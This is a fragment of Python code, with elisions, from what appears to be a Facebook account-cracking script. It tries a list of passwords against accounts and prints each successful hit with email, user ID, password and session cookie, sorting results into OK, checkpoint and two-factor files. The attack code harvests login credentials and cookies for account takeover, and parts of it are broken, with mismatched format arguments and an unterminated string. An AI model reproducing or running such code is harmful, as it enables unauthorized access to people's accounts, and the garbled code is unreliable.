...
def checks(oks,cps,twf):
    if not len(oks) != 0:
        pass
    if len(cps) != 0:
        print('\n\n\x1b[1;97m  OK : \x1b[1;97m %s  \x1b[1;97mKB-OK.txt' % (
            H, P, str(len(oks))))
        print('\x1b[1;97m  CP :\x1b[1;97m   %s \x1b[1;97mKB-CP.txt' %
              (H, P, str(len(cps))))
        print('\x1b[1;97m  2F :\x1b[1;97m   %s \x1b[1;97mKB-2F.txt' %
              (H, P, str(len(twf))))
        input("\x1b[1;97m   xyz  ")
        xyz()
loop = 0
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\r\033[1;32m[Ronny]---------------------[Ronny-Xd]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[69]')
                ...
                cid=coki[141:156]
                Red = '\033[1;31m'
                print(f'\r{Red}[Ronny]--------------------[Ronny-Sorry]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' Tsy azoko+ps+ '\n[69—]---------------------------------------------------[Ã—]\033[1;97m')
